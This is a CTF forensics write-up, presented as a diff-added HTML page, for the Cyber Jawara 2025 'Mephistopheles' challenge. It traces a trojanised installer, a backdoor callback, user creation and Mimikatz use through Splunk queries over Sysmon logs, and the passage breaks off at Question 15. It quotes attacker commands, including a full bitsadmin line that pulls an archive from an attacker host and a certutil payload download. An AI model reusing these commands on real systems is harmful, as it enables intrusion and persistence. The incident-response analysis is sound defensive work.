@@ -1,0 +1,386 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="Mephistopheles | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>Mephistopheles | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog">Blog</a><a href="/writeups" aria-current="page">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">Cyber Jawara National 2025</p><h1>Mephistopheles</h1><ul class="article-tags" aria-label="Article tags"><li>sysmon</li><li>windows-event-logs</li><li>splunk</li><li>nsis</li><li>malware-analysis</li></ul></header><div class="prose"><h3 id="challenge-description">Challenge Description</h3>
+<p>I have a hypothese that my device is compromised by my own friend in my office (again). Why do everyone always target me because I don’t have a single clue to setup my laptop securely? … Oh right .. that’s why. Anyway, can you help me out? I actually love customizing my Desktop theme with art.</p>
+<p><a href="https://drive.google.com/file/d/1L_a2xS6EVmVd79jvaG6P5pAwwP0ihIWk/view?usp=sharing">https://drive.google.com/file/d/1L_a2xS6EVmVd79jvaG6P5pAwwP0ihIWk/view?usp=sharing</a></p>
+<p>Zip password = <code>ce4b5a04dcf6bab39a40a0176efca37691f3fd17b69421d2b81f24563c44e924</code></p>
+<p>Please answer all the investigation-based questions by connecting to the remote IP</p>
+<p>There are multi stage of episodes with total 25 Questions, and every time the next questions appear, it might need further analysis, not relatively judged by difficulty.</p>
+<p>NOTES: Please do run the malware inside the VM if necessary.</p>
+<p>Author: aseng</p>
+<h3 id="flag">Flag</h3>
+<p><code>CJ2025{APT_a.k.a_as3ng_p3rs1st3nt_thr34t_h!t5_4g4in_4nD_y0u_succ3ssfuLLy_s0lved_4ll_0f_th3m_w!th_gr4c3_&#x26;_gl0ry_ce4b5a04dc}</code></p>
+<hr>
+<h3 id="episode-i-the-responder-first-day">Episode I: The Responder First Day</h3>
+<h4 id="question-1">Question 1</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>The day of the compromise arrived from an installer downloads. Where is it downloaded from (Full URL)? What’s the name of the file and when was the file downloaded successfully to the disk? (Answer with underscores concatenated respectively)</p>
+<p>💡 Format: <code>http://jajar.baboi/M4Luwer.exe_M4Luwer.exe_10/28/2024 04:10:23 AM</code></p>
+</blockquote>
+<p>File downloads can be achieved using numerous programs, but one of those who has the details needed for these questions are browsers. Browsers usually store the download URL, timestamps and also destination file paths. In the <code>C:\Users\Administrator\AppData\Local</code> directory, we can see a <code>Google</code> directory that signifies that the administrator may be using Google Chrome as their preferred browser. History data can be found at <code>C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\History</code>. The <code>History</code> file is an SQLite 3 database that contains the history of the user’s browser, including download history.</p>
+<p>The database contains a table called <code>downloads</code> and we can check the schema of that table to see what kinds of data that it stores.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sqlite> .schema downloads</span></span>
+<span class="line"><span>CREATE TABLE downloads (id INTEGER PRIMARY KEY,guid VARCHAR NOT NULL,current_path LONGVARCHAR NOT NULL,target_path LONGVARCHAR NOT NULL,start_time INTEGER NOT NULL,received_bytes INTEGER NOT NULL,total_bytes INTEGER NOT NULL,state INTEGER NOT NULL,danger_type INTEGER NOT NULL,interrupt_reason INTEGER NOT NULL,hash BLOB NOT NULL,end_time INTEGER NOT NULL,opened INTEGER NOT NULL,last_access_time INTEGER NOT NULL,transient INTEGER NOT NULL,referrer VARCHAR NOT NULL,site_url VARCHAR NOT NULL,embedder_download_data VARCHAR NOT NULL,tab_url VARCHAR NOT NULL,tab_referrer_url VARCHAR NOT NULL,http_method VARCHAR NOT NULL,by_ext_id VARCHAR NOT NULL,by_ext_name VARCHAR NOT NULL,by_web_app_id VARCHAR NOT NULL,etag VARCHAR NOT NULL,last_modified VARCHAR NOT NULL,mime_type VARCHAR(255) NOT NULL,original_mime_type VARCHAR(255) NOT NULL);</span></span></code></pre>
+<p>From that schema, we can conclude that the information that we need to answer this question is stored in the <code>downloads</code> table. The URL of the download is stored in the <code>tab_url</code> column, the file name is stored in <code>target_path</code> and the timestamp is stored in <code>end_time</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sqlite> select tab_url, target_path, end_time from downloads;</span></span>
+<span class="line"><span>https://learn.microsoft.com/id-id/sysinternals/downloads/sysmon|C:\Users\Administrator\Downloads\Sysmon.zip|13410698732757449</span></span>
+<span class="line"><span>https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe|C:\Users\Administrator\Downloads\AnsiArtInstaller.exe|13410807272176740</span></span>
+<span class="line"><span>https://github.com/farag2/Install-Office/releases/tag/2.3.1|C:\Users\Administrator\Downloads\Install-Office.zip|13411035002127998</span></span></code></pre>
+<p>The result of the SQL query produces multiple rows, but the <code>AnsiArtInstaller.exe</code> row stands out due to the suspicious URL and the keyword <code>Installer</code> matching the question. But, we are given a timestamp instead of a human-readable time format. According to <a href="https://stackoverflow.com/questions/20458406/what-is-the-format-of-chromes-timestamps">this blog</a>, the timestamp given is in the format of microseconds since 1 January, 1601. We can use the given SQL query from the blog to convert the timestamp to a human-readable format.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>sqlite> select tab_url, target_path, datetime(end_time / 1000000 + (strftime('%s', '1601-01-01')), 'unixepoch', 'localtime') from downloads;</span></span>
+<span class="line"><span>https://learn.microsoft.com/id-id/sysinternals/downloads/sysmon|C:\Users\Administrator\Downloads\Sysmon.zip|2025-12-20 17:05:32</span></span>
+<span class="line"><span>https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe|C:\Users\Administrator\Downloads\AnsiArtInstaller.exe|2025-12-21 23:14:32</span></span>
+<span class="line"><span>https://github.com/farag2/Install-Office/releases/tag/2.3.1|C:\Users\Administrator\Downloads\Install-Office.zip|2025-12-24 14:30:02</span></span></code></pre>
+<p>We just need to pick out the file name and convert the time to 12-hour and we should get the correct answer. But, the time of <code>11:14:32 PM</code> is not accepted probably due to rounding errors so the answer is deducted by one second.</p>
+<p>Answer: <code>https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM</code></p>
+<h4 id="question-2">Question 2</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>When does the installer gets executed for the first time?</p>
+<p>💡 Format: 06/20/2021 10:23:14 AM</p>
+</blockquote>
+<p>This question requires us to analyse the Sysmon logs to see when <code>AnsiArtInstaller.exe</code> is executed for the first time. We can ingest the <code>.evtx</code> file to a SIEM such as Splunk to make this easier. I used <a href="https://github.com/omerbenamram/evtx">evtx_dump</a> to convert <code>.evtx</code> files to JSON so we can ingest it to Splunk. We can filter out the logs by checking for event code 1 (process creation) and filtering the <code>Image</code> field with our installer filename.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.System.EventID="1" Event.EventData.Image="*AnsiArtInstaller.exe"</span></span>
+<span class="line"><span>| sort _time</span></span>
+<span class="line"><span>| table Event.EventData.UtcTime</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q2_1.png" alt=""></p>
+<p>We can see the first result has the timestamp of <code>2025-12-21 16:15:10.406</code>. We just need to convert it to GMT+7 to get the answer we need.</p>
+<p>Answer: <code>12/21/2025 11:15:10 PM</code></p>
+<h4 id="question-3">Question 3</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>There are two files dropped after the user executed the installer (exclude the shortcut). What are the names of the files (include their extensions with comma delimiters)?</p>
+<p>💡 Format: dorodoro.exe,mangekyo.exe</p>
+</blockquote>
+<p>We can use Splunk again to filter Sysmon logs to see any files that is modified by the installer using the event code 2 (file creation time modified) and 11 (file created).</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" (Event.System.EventID="2" OR Event.System.EventID="11") Event.EventData.Image="*AnsiArtInstaller.exe"</span></span>
+<span class="line"><span>| table Event.EventData.TargetFilename</span></span></code></pre>
+<p>We can see three filenames as a result: <code>ansi_art.exe</code>, <code>program.banner</code>, and <code>AnsiArt.lnk</code>. We just need to exclude the shortcut as per the question’s request.</p>
+<p><img src="/images/mephisto/mephisto_q3_1.png" alt=""></p>
+<p>Answer: <code>ansi_art.exe,program.banner</code></p>
+<h4 id="question-4">Question 4</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Where did these files are dropped in the victim machine?</p>
+<p>💡 Format: D:\Blataran\DirectoryName</p>
+</blockquote>
+<p>We can see from the previous screenshot that the two files are stored in <code>C:\Users\ADMINI~1\AppData\Local\Temp\</code>, where <code>ADMINI~1</code> is a shorthand for our <code>Administrator</code> user.</p>
+<p>Answer: <code>C:\Users\Administrator\AppData\Local\Temp</code></p>
+<h4 id="question-5">Question 5</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>There’s a shortcut link file created as well. Where is this located in the victim’s machine?</p>
+<p>💡 Format: D:\Blataran\Jeje.lnk</p>
+</blockquote>
+<p>We also got this answer from our query result for question 4, where the shortcut is located at <code>C:\Users\Administrator\Desktop\AnsiArt.lnk</code>.</p>
+<p>Answer: <code>C:\Users\Administrator\Desktop\AnsiArt.lnk</code></p>
+<h4 id="question-6">Question 6</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>It looks like there’s a callback / backconnect / backdoor implemented but this is just a hypothesis for now. What’s the attacker IP &#x26; port used?</p>
+<p>💡 Format: 10.12.41.23:9999</p>
+</blockquote>
+<p>We can filter using the event code 3 to see any network connections done by the <code>AnsiArtInstaller.exe</code> executable.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.System.EventID="3" Event.EventData.Image="*AnsiArtInstaller.exe" </span></span>
+<span class="line"><span>| table Event.EventData.DestinationIp, Event.EventData.DestinationPort</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q6_1.png" alt=""></p>
+<p>We can see that we only got one unique answer of <code>192.168.100.157:443</code>.</p>
+<p>Answer: <code>192.168.100.157:443</code></p>
+<h3 id="episode-ii-the-adversary-breadcrumbs">Episode II: The Adversary Breadcrumbs</h3>
+<h4 id="question-7">Question 7</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Upon compromising the machine, the attacker uploads certain files from its host to the victim’s machine. What’s the full local URL that host these files?</p>
+<p>💡 Format: <a href="http://172.16.1.10:5656">http://172.16.1.10:5656</a></p>
+</blockquote>
+<p>We can try filter any commands that contains the string <code>http</code> to see if there is any attempts to download suspicious files.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CommandLine="*http*"</span></span>
+<span class="line"><span>| table Event.EventData.CommandLine</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q7_1.png" alt=""></p>
+<p>Lot’s of noise but we can see <code>certutil</code> trying to download an executable <code>PrintSpoofer64.exe</code> from <code>http://192.168.100.157:8082</code>.</p>
+<p>Answer: <code>http://192.168.100.157:8082</code></p>
+<h4 id="question-8">Question 8</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>Where do most of the uploaded files resided in the victim’s machine? Please do provide the full path!</p>
+<p>💡 Format: D:\Blataran</p>
+</blockquote>
+<p>We can modify the previous query to use the identified URL and also show the current directory of when the command is run.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CommandLine="*http://192.168.100.157:8082*"</span></span>
+<span class="line"><span>| table Event.EventData.CommandLine, Event.EventData.CurrentDirectory</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q8_1.png" alt=""></p>
+<p>We can see that all commands that is accessing the identified URL has the current directory set to <code>C:\h1dd3n\</code>.</p>
+<p>Answer: <code>C:\h1dd3n</code></p>
+<h4 id="question-9">Question 9</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>The FIRST two files which attacker has uploaded to the victim’s machine was leveraged by using a Living-Off-the-Land Binaries/Executable(s). One of the uploaded file was a secure deletion compressed file. Please do provide this full VALID command!</p>
+<p>💡 Format: D:\Blataran\harambe.exe galileo “jupri”</p>
+</blockquote>
+<p>We can see from the second row of the previous screenshot that the <code>bitsadmin.exe</code> executable is downloading an archive named <code>SDelete.zip</code> to <code>C:\h1dd3n\sadewa.zip</code>.</p>
+<p>Answer: <code>C:\Windows\system32\bitsadmin.exe /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\h1dd3n\sadewa.zip</code></p>
+<h4 id="question-10">Question 10</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>After unzipping these two files, what are the first OS command utility executed by the attacker?</p>
+<p>💡 Format: hostname</p>
+</blockquote>
+<p>First, we need to get the timestamp of when the <code>sadewa.zip</code> is downloaded. We need this timestamp to track any commands run after that time.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CommandLine="*sadewa.zip*" </span></span>
+<span class="line"><span>| sort _time</span></span></code></pre>
+<p>After running that query, we get the timestamp and filter any commands that is run after the timestamp.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CommandLine="*" earliest=12/22/2025:02:30:23</span></span>
+<span class="line"><span>| sort _time</span></span>
+<span class="line"><span>| table _time, Event.EventData.CommandLine</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q10_1.png" alt=""></p>
+<p>We can see after downloading the <code>sadewa.zip</code>, the attacker is running <code>ipconfig</code>.</p>
+<p>Answer: <code>ipconfig</code></p>
+<h4 id="question-11">Question 11</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>The attacker created an arbitrary user in the victim’s machine, although there are several attempts. What are the final fixed user credentials that was used by the attacker? (Use underscores to distinguish the username and its password)</p>
+<p>💡 Format: juniper_p4ssw0rd</p>
+</blockquote>
+<p>We filter out the logs by checking if <code>CommandLine</code> contains <code>net user /add</code> and sort by time to see the latest command.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CommandLine="*net*user*/add*"</span></span>
+<span class="line"><span>| sort _time</span></span>
+<span class="line"><span>| table _time, Event.EventData.CommandLine</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q11_1.png" alt=""></p>
+<p>The latest user add command is using the credentials <code>as3ng_AsengCupu123!</code>.</p>
+<p>Answer: <code>as3ng_AsengCupu123!</code></p>
+<h4 id="question-12">Question 12</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>The attacker assigned the arbitrary user to 2 groups. What are those? Use comma delimiters to answer this question!</p>
+<p>💡 Format: Enterprise Admin Users,File Operators</p>
+</blockquote>
+<p>We can modify the previous query to instead check for <code>net localgroup /add</code> commands.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CommandLine="*net*localgroup*/add*"</span></span>
+<span class="line"><span>| sort _time</span></span>
+<span class="line"><span>| table _time, Event.EventData.CommandLine</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q12_1.png" alt=""></p>
+<p>We can see two groups added to the <code>as3ng</code> users: <code>administrators</code> and <code>Remote Desktop Users</code>.</p>
+<p>Answer: <code>administrators,Remote Desktop Users</code></p>
+<h4 id="question-13">Question 13</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>After these actions done, when was the FIRST TIME that the attacker SUCCESSFULLY logins to the victim’s machine using the arbitrary user credentials through RDP? (Answer in format MM/DD/YYYY HH:MM AM/PM)</p>
+<p>💡 Format: 06/15/2024 03:45 PM</p>
+</blockquote>
+<p>First we need to take note of the timestamp of the last command of the previous question which is <code>12/22/2025:02:35:16</code> in my case. Then we need to pivot to the Terminal Services Operational logs to check any RDP logins.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="terminalservices.json" Event.System.EventID="1149"</span></span>
+<span class="line"><span>| sort _time</span></span>
+<span class="line"><span>| table _time, Event.UserData.EventXML.Param1, Event.UserData.EventXML.Param3</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q13_1.png" alt=""></p>
+<p>We can see the first timestamp is <code>2025-12-22 03:02:31.108</code>. We can convert it from GMT+10 to GMT+7 and use the given format to get the answer.</p>
+<p>Answer: <code>12/22/2025 12:02 AM</code></p>
+<h4 id="question-14">Question 14</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
+<p class="markdown-alert-title" dir="auto"><svg class="octicon" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>NOTE</p>
+<p>What is the modified executable file’s name that was used from the attacker to perform a credential dumping? Please do provide the answer in form of full path!</p>
+<p>💡 Format: C:\Tools\credump.exe</p>
+</blockquote>
+<p>We can go back to Sysmon logs to see all commands that is run when the current directory is set to <code>C:\h1dd3n\</code>.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>index="cj2025_mephisto" source="sysmon.json" Event.EventData.CurrentDirectory="C:\\h1dd3n\\"</span></span>
+<span class="line"><span>| table Event.EventData.CommandLine</span></span></code></pre>
+<p><img src="/images/mephisto/mephisto_q14_1.png" alt=""></p>
+<p>We can see the first two rows shows a Mimikatz instance running with the executable name of <code>mimiperi.exe</code></p>
+<p>Answer: <code>C:\h1dd3n\mimiperi.exe</code></p>
+<h4 id="question-15">Question 15</h4>
+<blockquote class="markdown-alert markdown-alert-note" dir="auto">
